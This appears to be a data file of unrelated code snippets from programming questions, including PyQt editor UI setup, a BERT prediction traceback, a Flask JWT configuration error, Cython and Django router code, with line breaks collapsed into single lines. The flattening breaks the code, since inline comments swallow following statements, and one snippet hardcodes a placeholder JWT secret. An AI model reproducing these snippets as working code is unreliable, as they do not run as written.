QtGui.QPixmap ( _fromUtf8 ( `` : /icons/paste.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionPaste.setIcon ( icon9 ) self.actionPaste.setObjectName ( _fromUtf8 ( `` actionPaste '' ) ) self.actionSelect_All = QtGui.QAction ( RSLEditorClass ) self.actionSelect_All.setObjectName ( _fromUtf8 ( `` actionSelect_All '' ) ) self.actionCompile = QtGui.QAction ( RSLEditorClass ) icon10 = QtGui.QIcon ( ) icon10.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/compile.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionCompile.setIcon ( icon10 ) self.actionCompile.setObjectName ( _fromUtf8 ( `` actionCompile '' ) ) self.actionFind_Replace = QtGui.QAction ( RSLEditorClass ) self.actionFind_Replace.setObjectName ( _fromUtf8 ( `` actionFind_Replace '' ) ) self.actionPreferences = QtGui.QAction ( RSLEditorClass ) icon11 = QtGui.QIcon ( ) icon11.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/prefs.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionPreferences.setIcon ( icon11 ) self.actionPreferences.setObjectName ( _fromUtf8 ( `` actionPreferences '' ) ) self.actionAdd_Shader_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_Shader_Path.setObjectName ( _fromUtf8 ( `` actionAdd_Shader_Path '' ) ) self.actionAdd_Textures_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_Textures_Path.setObjectName ( _fromUtf8 ( `` actionAdd_Textures_Path '' ) ) self.actionAdd_Archives_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_Archives_Path.setObjectName ( _fromUtf8 ( `` actionAdd_Archives_Path '' ) ) self.actionAdd_PointCloud_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_PointCloud_Path.setObjectName ( _fromUtf8 ( `` actionAdd_PointCloud_Path '' ) ) self.actionAdd_BrickMap_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_BrickMap_Path.setObjectName ( _fromUtf8 ( `` actionAdd_BrickMap_Path '' ) ) self.actionAdd_PhotonMap_Path = QtGui.QAction ( RSLEditorClass ) self.actionAdd_PhotonMap_Path.setObjectName ( _fromUtf8 ( `` actionAdd_PhotonMap_Path '' ) ) self.actionEditor_Docs = QtGui.QAction ( RSLEditorClass ) self.actionEditor_Docs.setObjectName ( _fromUtf8 ( `` actionEditor_Docs '' ) ) self.actionDelight_Docs = QtGui.QAction ( RSLEditorClass ) self.actionDelight_Docs.setObjectName ( _fromUtf8 ( `` actionDelight_Docs '' ) ) self.actionPRMan_Docs = QtGui.QAction ( RSLEditorClass ) self.actionPRMan_Docs.setObjectName ( _fromUtf8 ( `` actionPRMan_Docs '' ) ) self.actionFundza = QtGui.QAction ( RSLEditorClass ) self.actionFundza.setObjectName ( _fromUtf8 ( `` actionFundza '' ) ) self.actionColor_Picker = QtGui.QAction ( RSLEditorClass ) self.actionColor_Picker.setObjectName ( _fromUtf8 ( `` actionColor_Picker '' ) ) self.actionClose_Tab = QtGui.QAction ( RSLEditorClass ) self.actionClose_Tab.setObjectName ( _fromUtf8 ( `` actionClose_Tab '' ) ) self.actionExit = QtGui.QAction ( RSLEditorClass ) self.actionExit.setObjectName ( _fromUtf8 ( `` actionExit '' ) ) self.menuRecent_Files.addSeparator ( ) self.menuFile.addAction ( self.actionNew ) self.menuFile.addAction ( self.actionOpen ) self.menuFile.addAction ( self.menuRecent_Files.menuAction ( ) ) self.menuFile.addSeparator ( ) self.menuFile.addAction ( self.actionSave ) self.menuFile.addAction ( self.actionSave_As ) self.menuFile.addSeparator ( ) self.menuFile.addAction ( self.actionClose_Tab ) self.menuFile.addAction ( self.actionExit ) self.menuSearch_Options.addAction ( self.actionAdd_Shader_Path ) self.menuSearch_Options.addAction ( self.actionAdd_Textures_Path ) self.menuSearch_Options.addAction ( self.actionAdd_Archives_Path ) self.menuSearch_Options.addAction ( self.actionAdd_PointCloud_Path ) self.menuSearch_Options.addAction ( self.actionAdd_BrickMap_Path ) self.menuSearch_Options.addAction ( self.actionAdd_PhotonMap_Path ) self.menuEdit.addAction ( self.actionUndo ) self.menuEdit.addAction ( self.actionRedo ) self.menuEdit.addSeparator ( ) self.menuEdit.addAction ( self.actionCut ) self.menuEdit.addAction ( self.actionCopy ) self.menuEdit.addAction ( self.actionPaste ) self.menuEdit.addSeparator ( ) self.menuEdit.addAction ( self.actionSelect_All ) self.menuEdit.addSeparator ( ) self.menuEdit.addAction ( self.menuSearch_Options.menuAction ( ) ) self.menuEdit.addAction ( self.actionColor_Picker ) self.menuSearch.addAction ( self.actionFind_Replace ) self.menuDebug.addAction ( self.actionCompile ) self.menuDebug.addSeparator ( ) self.menuDebug.addAction ( self.actionPreferences ) self.menuHelp.addAction ( self.actionEditor_Docs ) self.menuHelp.addSeparator ( ) self.menuHelp.addAction ( self.actionDelight_Docs ) self.menuHelp.addSeparator ( ) self.menuHelp.addAction ( self.actionPRMan_Docs ) self.menuHelp.addSeparator ( ) self.menuHelp.addAction ( self.actionFundza ) self.menuBar.addAction ( self.menuFile.menuAction ( ) ) self.menuBar.addAction ( self.menuEdit.menuAction ( ) ) self.menuBar.addAction ( self.menuView.menuAction ( ) ) self.menuBar.addAction ( self.menuSearch.menuAction ( ) ) self.menuBar.addAction ( self.menuDebug.menuAction ( ) ) self.menuBar.addAction ( self.menuHelp.menuAction ( ) ) self.mainToolBar.addAction ( self.actionNew ) self.mainToolBar.addAction ( self.actionOpen ) self.mainToolBar.addAction ( self.actionSave ) self.mainToolBar.addAction ( self.actionSave_As ) self.mainToolBar.addAction ( self.actionUndo ) self.mainToolBar.addAction ( self.actionRedo ) self.mainToolBar.addAction ( self.actionCut ) self.mainToolBar.addAction ( self.actionCopy ) self.mainToolBar.addAction ( self.actionPaste ) self.mainToolBar.addAction ( self.actionCompile ) self.mainToolBar.addAction ( self.actionPreferences ) self.retranslateUi ( RSLEditorClass ) self.tabMain.setCurrentIndex ( -1 ) self.tabOutput.setCurrentIndex ( 0 ) QtCore.QMetaObject.connectSlotsByName ( RSLEditorClass ) def retranslateUi ( self , RSLEditorClass ) : RSLEditorClass.setWindowTitle ( _translate ( `` RSLEditorClass '' , `` RSLEditor '' , None ) ) self.lbFilePath.setText ( _translate ( `` RSLEditorClass '' , `` File Path : '' , None ) ) self.tabOutput.setTabText ( self.tabOutput.indexOf ( self.tabRSLOut ) , _translate ( `` RSLEditorClass '' , `` RSL Output '' , None ) ) self.tabOutput.setTabText ( self.tabOutput.indexOf ( self.tabRIBOut ) , _translate ( `` RSLEditorClass '' , `` RIB Output '' , None ) ) self.menuFile.setTitle ( _translate ( `` RSLEditorClass '' , `` File '' , None ) ) self.menuRecent_Files.setTitle ( _translate ( `` RSLEditorClass '' , `` Recent Files '' , None ) ) self.menuEdit.setTitle ( _translate ( `` RSLEditorClass '' , `` Edit '' , None ) ) self.menuSearch_Options.setTitle ( _translate ( `` RSLEditorClass '' , `` Search Options '' , None ) ) self.menuView.setTitle ( _translate ( `` RSLEditorClass '' , `` View '' , None ) ) self.menuSearch.setTitle ( _translate ( `` RSLEditorClass '' , `` Search '' , None ) ) self.menuDebug.setTitle ( _translate ( `` RSLEditorClass '' , `` Debug '' , None ) ) self.menuHelp.setTitle ( _translate ( `` RSLEditorClass '' , `` Help '' , None ) ) self.actionNew.setText ( _translate ( `` RSLEditorClass '' , `` New '' , None ) ) self.actionNew.setToolTip ( _translate ( `` RSLEditorClass '' , `` Create a new file '' , None ) ) self.actionNew.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+N '' , None ) ) self.actionOpen.setText ( _translate ( `` RSLEditorClass '' , `` Open '' , None ) ) self.actionOpen.setToolTip ( _translate ( `` RSLEditorClass '' , `` Open a file '' , None ) ) self.actionOpen.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+O '' , None ) ) self.actionSave.setText ( _translate ( `` RSLEditorClass '' , `` Save '' , None ) ) self.actionSave.setToolTip ( _translate ( `` RSLEditorClass '' , `` Save the current file '' , None ) ) self.actionSave.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+S '' , None ) ) self.actionSave_As.setText ( _translate ( `` RSLEditorClass '' , `` Save As '' , None ) ) self.actionSave_As.setToolTip ( _translate ( `` RSLEditorClass '' , `` Save as a new file '' , None ) ) self.actionSave_As.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+Alt+S '' , None ) ) self.actionUndo.setText ( _translate ( `` RSLEditorClass '' , `` Undo '' , None ) ) self.actionUndo.setToolTip ( _translate ( `` RSLEditorClass '' , `` Undo last action '' , None ) ) self.actionUndo.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+Z '' , None ) ) self.actionRedo.setText ( _translate ( `` RSLEditorClass '' , `` Redo '' , None ) ) self.actionRedo.setToolTip ( _translate ( `` RSLEditorClass '' , `` Redo last action '' , None ) ) self.actionRedo.setShortcut ( _translate ( `` RSLEditorClass '' , `` Shift+Z '' , None ) ) self.actionCut.setText ( _translate ( `` RSLEditorClass '' , `` Cut '' , None ) ) self.actionCut.setToolTip ( _translate ( `` RSLEditorClass '' , `` Cut selected text '' , None ) ) self.actionCut.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+X '' , None ) ) self.actionCopy.setText ( _translate ( `` RSLEditorClass '' , `` Copy '' , None ) ) self.actionCopy.setToolTip ( _translate ( `` RSLEditorClass '' , `` Copy selected text '' , None ) ) self.actionCopy.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+C '' , None ) ) self.actionPaste.setText ( _translate ( `` RSLEditorClass '' , `` Paste '' , None ) ) self.actionPaste.setToolTip ( _translate ( `` RSLEditorClass '' , `` Paste text '' , None ) ) self.actionPaste.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+V '' , None ) ) self.actionSelect_All.setText ( _translate ( `` RSLEditorClass '' , `` Select All '' , None ) ) self.actionSelect_All.setToolTip ( _translate ( `` RSLEditorClass '' , `` Select all text '' , None ) ) self.actionSelect_All.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+A '' , None ) ) self.actionCompile.setText ( _translate ( `` RSLEditorClass '' , `` Compile '' , None ) ) self.actionCompile.setToolTip ( _translate ( `` RSLEditorClass '' , `` Compile current document '' , None ) ) self.actionCompile.setShortcut ( _translate ( `` RSLEditorClass '' , `` Alt+E '' , None ) ) self.actionFind_Replace.setText ( _translate ( `` RSLEditorClass '' , `` Find/Replace '' , None ) ) self.actionFind_Replace.setToolTip ( _translate ( `` RSLEditorClass '' , `` Open find/replace dialog '' , None ) ) self.actionFind_Replace.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+F '' , None ) ) self.actionPreferences.setText ( _translate ( `` RSLEditorClass '' , `` Preferences '' , None ) ) self.actionPreferences.setToolTip ( _translate ( `` RSLEditorClass '' , `` Open the preferences dialog '' , None ) ) self.actionPreferences.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+P '' , None ) ) self.actionAdd_Shader_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add Shader Path '' , None ) ) self.actionAdd_Textures_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add Textures Path '' , None ) ) self.actionAdd_Archives_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add Archives Path '' , None ) ) self.actionAdd_PointCloud_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add PointCloud Path '' , None ) ) self.actionAdd_BrickMap_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add BrickMap Path '' , None ) ) self.actionAdd_PhotonMap_Path.setText ( _translate ( `` RSLEditorClass '' , `` Add PhotonMap Path '' , None ) ) self.actionEditor_Docs.setText ( _translate ( `` RSLEditorClass '' , `` Editor Docs '' , None ) ) self.actionDelight_Docs.setText ( _translate ( `` RSLEditorClass '' , `` 3Delight Docs '' , None ) ) self.actionPRMan_Docs.setText ( _translate ( `` RSLEditorClass '' , `` PRMan Docs '' , None ) ) self.actionFundza.setText ( _translate ( `` RSLEditorClass '' , `` Fundza '' , None ) ) self.actionColor_Picker.setText ( _translate ( `` RSLEditorClass '' , `` Color Picker '' , None ) ) self.actionColor_Picker.setShortcut ( _translate ( `` RSLEditorClass '' , `` Ctrl+I '' , None ) ) self.actionClose_Tab.setText ( _translate ( `` RSLEditorClass '' , `` Close Tab '' , None ) ) self.actionExit.setText ( _translate ( `` RSLEditorClass '' , `` Exit '' , None ) ) import rsleditor_rc"
textId score textInfo0 name1 1.0 text_stuff1 name1 2.0 different_text_stuff2 name1 2.0 text_stuff3 name2 1.0 different_text_stuff4 name2 1.3 different_text_stuff5 name2 2.0 still_different_text6 name2 1.0 yoko ono7 name2 3.0 I lika da Gweneth8 name3 1.0 Always a tradeoff9 name3 3.0 What ? ! import pandas as pddf=pd.read_clipboard ( sep='\s\s+ ' ) textId score textInfo0 name2 1.0 different_text_stuff1 name2 1.3 different_text_stuff2 name2 2.0 still_different_text3 name2 1.0 yoko ono4 name2 3.0 I lika da Gweneth
"with open ( 'islandin.txt ' ) as fin : num_houses , length = map ( int , fin.readline ( ) .split ( ) ) tot_length = length * 4 # side length of square houses = [ map ( int , line.split ( ) ) for line in fin ] # inhabited houses read into list from text filedef cost ( house_no ) : money = 0 for h , p in houses : if h == house_no : # Skip this house since you do n't count the one you build on continue d = abs ( h - house_no ) shortest_dist = min ( d , tot_length - d ) money += shortest_dist * p return moneydef paths ( ) : for house_no in xrange ( 1 , length * 4 + 1 ) : yield house_no , cost ( house_no ) print house_no , cost ( house_no ) # for testingprint max ( paths ( ) , key=lambda ( h , m ) : m ) # Gets max path based on the money it makes max_money = 0max_location = 0for every location in 1 to length * 4 + 1 money = 0 for house in inhabited_houses : money = money + shortest_dist * num_people_in_this_house if money > max_money max_money = money max_location = location"
@ apidef post_comment ( comment ) '' `` '' '' Posts a coment `` '' '' pass
"def serving_input_receiver_fn ( ) : feature_spec = { `` input_ids '' : tf.FixedLenFeature ( [ MAX_SEQ_LENGTH ] , tf.int64 ) , `` input_mask '' : tf.FixedLenFeature ( [ MAX_SEQ_LENGTH ] , tf.int64 ) , `` segment_ids '' : tf.FixedLenFeature ( [ MAX_SEQ_LENGTH ] , tf.int64 ) , `` label_ids '' : tf.FixedLenFeature ( [ ] , tf.int64 ) } serialized_tf_example = tf.placeholder ( dtype=tf.string , shape= [ None ] , name='input_example_tensor ' ) print ( serialized_tf_example.shape ) receiver_tensors = { 'example ' : serialized_tf_example } features = tf.parse_example ( serialized_tf_example , feature_spec ) return tf.estimator.export.ServingInputReceiver ( features , receiver_tensors ) export_path = '/content/drive/My Drive/binary_class/bert/'estimator._export_to_tpu = False # this is importantestimator.export_saved_model ( export_dir_base=export_path , serving_input_receiver_fn=serving_input_receiver_fn ) pred_sentences = [ `` A novel , simple method to get insights from reviews '' ] def getPrediction1 ( in_sentences ) : labels = [ `` Irrelevant '' , `` Relevant '' ] input_examples = [ run_classifier.InputExample ( guid= '' '' , text_a = x , text_b = None , label = 0 ) for x in in_sentences ] # here , `` '' is just a dummy label input_features = run_classifier.convert_examples_to_features ( input_examples , label_list , MAX_SEQ_LENGTH , tokenizer ) predict_input_fn = run_classifier.input_fn_builder ( features=input_features , seq_length=MAX_SEQ_LENGTH , is_training=False , drop_remainder=False ) predictions = est.predict ( predict_input_fn ) print ( predictions ) return [ ( sentence , prediction [ 'probabilities ' ] , labels [ prediction [ 'labels ' ] ] ) for sentence , prediction in zip ( in_sentences , predictions ) ] est = tf.contrib.estimator.SavedModelEstimator ( MODEL_FILE_PATH ) predictions = getPrediction1 ( pred_sentences [ 0 ] ) predictions W0702 05:44:17.551325 139812812932992 estimator.py:1811 ] Using temporary folder as model directory : /tmp/tmpzeiaa6q8W0702 05:44:17.605536 139812812932992 saved_model_estimator.py:170 ] train mode not found in SavedModel.W0702 05:44:17.608479 139812812932992 saved_model_estimator.py:170 ] eval mode not found in SavedModel. < generator object Estimator.predict at 0x7f27fa721eb8 > -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -KeyError Traceback ( most recent call last ) < ipython-input-28-56ea95428bf4 > in < module > ( ) 21 # Relevant `` Nanoparticulate drug delivery is a promising drug delivery system to a range of molecules to desired site specific action in the body . In this present work nanoparticles are prepared with positive group of amino group of chitosan with varying concentration based nanoparticles are loaded with anastrazole were prepared by with negative group of sodium tripolyphosphate by ionotropic gelation method . All these formulated nanoparticles are characterized for its particle size , zeta potential , drug entrapment efficacy and in-vitro release kinetics .The particle size of all these formulations were found to be 200,365,420,428 And 483.zeta potential of all formulations are-16.3±2.1 ,28.2±4.3 , -10.38±3.6 , -24.31±3.2 and 21.38±5.2.respectively . FT-IR studies indicated that there was no chemical interaction between drug and polymer and stability of drug . The in-vitro release behaviour from all the drug loaded batches was found to be zero order and provided sustained release over a period of 12 h by diffusion and swelling mechanism and The values of n and r 2 for coated batch was 0.731 and 0.979.Since the values of slope ( n ) lies in between 0.5 and 1 it was concluded that the mechanism by which drug is being released is a Non-Fickian anomalous solute diffusion mechanism , `` 22 -- - > 23 predictions = getPrediction1 ( pred_sentences [ 0:2 ] ) 24 predictions 25 5 frames < ipython-input-28-56ea95428bf4 > in getPrediction1 ( in_sentences ) 14 predictions = est.predict ( predict_input_fn ) 15 print ( predictions ) -- - > 16 return [ ( sentence , prediction [ 'probabilities ' ] , labels [ prediction [ 'labels ' ] ] ) for sentence , prediction in zip ( in_sentences , predictions ) ] 17 18 < ipython-input-28-56ea95428bf4 > in < listcomp > ( .0 ) 14 predictions = est.predict ( predict_input_fn ) 15 print ( predictions ) -- - > 16 return [ ( sentence , prediction [ 'probabilities ' ] , labels [ prediction [ 'labels ' ] ] ) for sentence , prediction in zip ( in_sentences , predictions ) ] 17 18 /usr/local/lib/python3.6/dist-packages/tensorflow_estimator/python/estimator/estimator.py in predict ( self , input_fn , predict_keys , hooks , checkpoint_path , yield_single_examples ) 615 self._create_and_assert_global_step ( g ) 616 features , input_hooks = self._get_features_from_input_fn ( -- > 617 input_fn , ModeKeys.PREDICT ) 618 estimator_spec = self._call_model_fn ( 619 features , None , ModeKeys.PREDICT , self.config ) /usr/local/lib/python3.6/dist-packages/tensorflow_estimator/python/estimator/estimator.py in _get_features_from_input_fn ( self , input_fn , mode ) 991 def _get_features_from_input_fn ( self , input_fn , mode ) : 992 `` '' '' Extracts the ` features ` from return values of ` input_fn ` . '' '' '' -- > 993 result = self._call_input_fn ( input_fn , mode ) 994 result , _ , hooks = estimator_util.parse_input_fn_result ( result ) 995 self._validate_features_in_predict_input ( result ) /usr/local/lib/python3.6/dist-packages/tensorflow_estimator/python/estimator/estimator.py in _call_input_fn ( self , input_fn , mode , input_context ) 1111 kwargs [ 'input_context ' ] = input_context 1112 with ops.device ( '/cpu:0 ' ) : - > 1113 return input_fn ( **kwargs ) 1114 1115 def _call_model_fn ( self , features , labels , mode , config ) : /usr/local/lib/python3.6/dist-packages/bert/run_classifier.py in input_fn ( params ) 727 def input_fn ( params ) : 728 `` '' '' The actual input function . '' '' '' -- > 729 batch_size = params [ `` batch_size '' ] 730 731 num_examples = len ( features ) KeyError : 'batch_size ' estimator.params [ 'batch_size ' ] # 32est.params [ 'batch_size ' ] # KeyError : 'batch_size '"
"# ! /usr/bin/env python # -*- coding : utf8 -*-from __future__ import divisioncimport numpy as npimport numpy as npcimport cython @ cython.boundscheck ( False ) def power_spectrum ( time , data , double f_min , double f_max , double df , w=1 ) : cdef double com , f cdef double s , c , sc , cc , ss cdef np.ndarray [ double , ndim=1 ] power cdef np.ndarray [ double , ndim=1 ] freq alfa , beta = [ ] , [ ] m = np.mean ( data ) data -= m freq = np.arange ( f_min , f_max , df ) for f in freq : sft = np.sin ( 2*np.pi*f*time ) cft = np.cos ( 2*np.pi*f*time ) s = np.sum ( w*data*sft ) c = np.sum ( w*data*cft ) ss = np.sum ( w*sft**2 ) cc = np.sum ( w*cft**2 ) sc = np.sum ( w*sft*cft ) alfa.append ( ( s*cc-c*sc ) / ( ss*cc-sc**2 ) ) beta.append ( ( c*ss-s*sc ) / ( ss*cc-sc**2 ) ) com = - ( f-f_min ) / ( f_min-f_max ) *100 print `` % 0.3f % % complete '' % com power = np.array ( alfa ) **2 + np.array ( beta ) **2 return freq , power , alfa , beta cython -a power_spectrum.pyx"
"executor = futures.ProcessPoolExecutor ( max_workers=5 ) running = [ ] def consume ( message ) : print `` actually consuming a single message '' def on_message ( channel , method_frame , header_frame , message ) : # this method is called once per incoming message future = executor.submit ( consume , message ) block_until_a_free_worker ( executor , future ) def block_until_a_free_worker ( executor , future ) : running.append ( future ) # this grows forever ! futures.wait ( running , timeout=5 , return_when=futures.FIRST_COMPLETED ) [ ... ] channel.basic_consume ( on_message , 'my_queue ' ) channel.start_consuming ( ) futures.wait ( running , timeout=5 , return_when=futures.FIRST_COMPLETED )"
"from flask_jwt_extended import ( create_access_token , get_jwt_identity , JWTManager , jwt_required , get_raw_jwt ) from flask import Flask , request , Blueprintapp = Flask ( __name__ ) app.config [ 'JWT_SECRET_KEY ' ] = 'this-is-super-secret'app.config [ 'JWT_BLACKLIST_ENABLED ' ] = Trueapp.config [ 'JWT_BLACKLIST_TOKEN_CHECKS ' ] = [ 'access ' ] jwt = JWTManager ( app ) @ app.route ( ... . ) @ jwt required from flask_jwt_extended import ( create_access_token , get_jwt_identity , JWTManager , jwt_required , get_raw_jwt ) from flask import Flask , request , Blueprintapp = Flask ( __name__ ) app.config [ 'JWT_SECRET_KEY ' ] = 'this-is-super-secret'app.config [ 'JWT_BLACKLIST_ENABLED ' ] = Trueapp.config [ 'JWT_BLACKLIST_TOKEN_CHECKS ' ] = [ 'access ' ] jwt = JWTManager ( app ) user_blueprint = Blueprint ( 'user_blueprint ' , __name__ ) @ user_blueprint.route ( ... . ) @ jwt required from user import *app = Flask ( __name__ ) app.register_blueprint ( user_blueprint ) Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/dist-packages/flask_jwt_extended/utils.py '' , line 127 , in _get_jwt_manager return current_app.extensions [ 'flask-jwt-extended ' ] KeyError : 'flask-jwt-extended'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/dist-packages/flask/app.py '' , line 2292 , in wsgi_app response = self.full_dispatch_request ( ) File `` /usr/local/lib/python3.6/dist-packages/flask/app.py '' , line 1815 , in full_dispatch_request rv = self.handle_user_exception ( e ) File `` /usr/local/lib/python3.6/dist-packages/flask/app.py '' , line 1718 , in handle_user_exception reraise ( exc_type , exc_value , tb ) File `` /usr/local/lib/python3.6/dist-packages/flask/_compat.py '' , line 35 , in reraise raise value File `` /usr/local/lib/python3.6/dist-packages/flask/app.py '' , line 1813 , in full_dispatch_request rv = self.dispatch_request ( ) File `` /usr/local/lib/python3.6/dist-packages/flask/app.py '' , line 1799 , in dispatch_request return self.view_functions [ rule.endpoint ] ( **req.view_args ) File `` /home/ali/Desktop/cetia_api/user.py '' , line 63 , in login return create_token ( user_inputs ) File `` /home/ali/Desktop/cetia_api/user_functions.py '' , line 103 , in create_token access_token = create_access_token ( identity=data , expires_delta=expires ) File `` /usr/local/lib/python3.6/dist-packages/flask_jwt_extended/utils.py '' , line 156 , in create_access_token jwt_manager = _get_jwt_manager ( ) File `` /usr/local/lib/python3.6/dist-packages/flask_jwt_extended/utils.py '' , line 129 , in _get_jwt_manager raise RuntimeError ( `` You must initialize a JWTManager with this flask `` RuntimeError : You must initialize a JWTManager with this flask application before using this method"
static void Main ( string [ ] args ) { var temp = from q in GetRandomNumbers ( 100 ) .Distinct ( ) .Take ( 5 ) select q ; } private static IEnumerable GetRandomNumbers ( int max ) { Random r = new Random ( ) ; while ( true ) { yield return r.Next ( max ) ; } }
"os.mkfifo ( 'pipe.tmp ' ) enc = Popen ( [ 'encoder ' , '-i ' , 'pipe.tmp ' ] ) cap = Popen ( [ 'capture ' , '-f ' , 'pipe.tmp ' ] ) cap = Popen ( [ 'capture ' , '-f ' , '/dev/stdout ' ] , stdout=PIPE ) enc = Popen ( [ 'encoder ' , '-i ' , '- ' ] , stdin=cap.stdout ) cap.stdout.close ( )"
"import dockerc = docker.from_env ( ) c.containers.run ( 'containername ' , 'sh some_script.sh ' , network='mynet ' )"
"Traceback ( most recent call last ) : File `` D : /_Python Practice/Core Python Programming/chapter_13_Classes/ WrappingFileObject.py '' , line 29 , in < module > for each_line in f : TypeError : 'CapOpen ' object is not iterable class CapOpen ( object ) : def __init__ ( self , filename , mode= ' r ' , buf=-1 ) : self.file = open ( filename , mode , buf ) def __str__ ( self ) : return str ( self.file ) def __repr__ ( self ) : return ` self.file ` def write ( self , line ) : self.file.write ( line.upper ( ) ) def __getattr__ ( self , attr ) : return getattr ( self.file , attr ) f = CapOpen ( 'wrappingfile.txt ' , ' w ' ) f.write ( 'delegation example\n ' ) f.write ( 'faye is good\n ' ) f.write ( 'at delegating\n ' ) f.close ( ) f = CapOpen ( 'wrappingfile.txt ' , ' r ' ) for each_line in f : # I am getting Exception Here.. print each_line ,"
deck=range ( 52 ) gens= [ ( i for i in deck if i % 13==v ) for v in range ( 13 ) ] gens [ 1 ] .next ( ) 1gens [ 1 ] .next ( ) 14gens [ 10 ] .next ( ) 10gens [ 10 ] .next ( ) 23 gens [ 1 ] .next ( ) 12gens [ 1 ] .next ( ) 25gens [ 1 ] .next ( ) 38
"static int_list_clear ( PyListObject *a ) { Py_ssize_t i ; PyObject **item = a- > ob_item ; if ( item ! = NULL ) { /* Because XDECREF can recursively invoke operations on this list , we make it empty first . */ i = Py_SIZE ( a ) ; Py_SIZE ( a ) = 0 ; a- > ob_item = NULL ; a- > allocated = 0 ; while ( -- i > = 0 ) { Py_XDECREF ( item [ i ] ) ; } PyMem_FREE ( item ) ; } /* Never fails ; the return value can be ignored . Note that there is no guarantee that the list is actually empty at this point , because XDECREF may have populated it again ! */ return 0 ; }"
"void writePixelsRect ( JoxColor* colors , int left , int top , int width , int height ) ; struct JoxColor { float r , g , b , a ; } ; c = JoxApi.JoxColor ( ) c.r = rc.g = gc.b = bc.a = aJoxApi.writePixelsRect ( c , x , y , 1 , 1 )"
"class Shape : def __init__ ( self , shapename , **kwds ) : self.shapename = shapename super ( ) .__init__ ( **kwds ) class ColoredShape ( Shape ) : def __init__ ( self , color , **kwds ) : self.color = color super ( ) .__init__ ( **kwds ) cs = ColoredShape ( color='red ' , shapename='circle ' ) class Shape : # ( object ) def __init__ ( self , shapename , **kwds ) : self.shapename = shapename # super ( ) .__init__ ( **kwds ) class ColoredShape ( Shape ) : def __init__ ( self , color , **kwds ) : self.color = color super ( ) .__init__ ( **kwds ) def check ( self ) : print ( self.color ) print ( self.shapename ) cs = ColoredShape ( color='red ' , shapename='circle ' ) cs.check ( ) # red # circle"
"if __name__ == '__main__ ' : print ( `` Still ok '' ) raise Exception ( `` Dummy exception '' ) print ( `` End of Program '' ) /usr/bin/python3.6 /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/pydevd.py -- multiproc -- qt-support=auto -- client 127.0.0.1 -- port 46850 -- file /home/ [ ... ] /test_traceback.pypydev debugger : process 18394 is connectingConnected to pydev debugger ( build 192.5728.105 ) Still ok Traceback ( most recent call last ) : File `` /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/pydevd.py '' , line 2060 , in < module > main ( ) File `` /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/pydevd.py '' , line 2054 , in main globals = debugger.run ( setup [ 'file ' ] , None , None , is_module ) File `` /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/pydevd.py '' , line 1405 , in run return self._exec ( is_module , entry_point_fn , module_name , file , globals , locals ) File `` /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/pydevd.py '' , line 1412 , in _exec pydev_imports.execfile ( file , globals , locals ) # execute the script File `` /home/ [ ... ] /pycharm-community-2019.2/helpers/pydev/_pydev_imps/_pydev_execfile.py '' , line 18 , in execfile exec ( compile ( contents+ '' \n '' , file , 'exec ' ) , glob , loc ) File `` /home/ [ ... ] /test_traceback.py '' , line 4 , in < module > raise Exception ( `` Dummy exception '' ) Exception : Dummy exceptionProcess finished with exit code 1"
"class CustomRouter ( object ) : def db_for_read ( self , model , **hints ) : return 'default ' def db_for_write ( self , model , **hints ) : return 'default ' def allow_relation ( self , obj1 , obj2 , **hints ) : db_list = ( 'default ' , ) if obj1._state.db in db_list and obj2._state.db in db_list : return True return None def allow_migrate ( self , db , app_label , model_name=None , **hints ) : return db == 'default ' DATABASE_ROUTERS = [ 'my_project.common.routers.CustomRouter ' , ] ... raise MigrationSchemaMissing ( `` Unable to create the django_migrations table ( % s ) '' % exc ) django.db.migrations.exceptions.MigrationSchemaMissing : Unable to create the django_migrations table ( Column `` django_migrations.id '' has unsupported type `` serial '' . )"
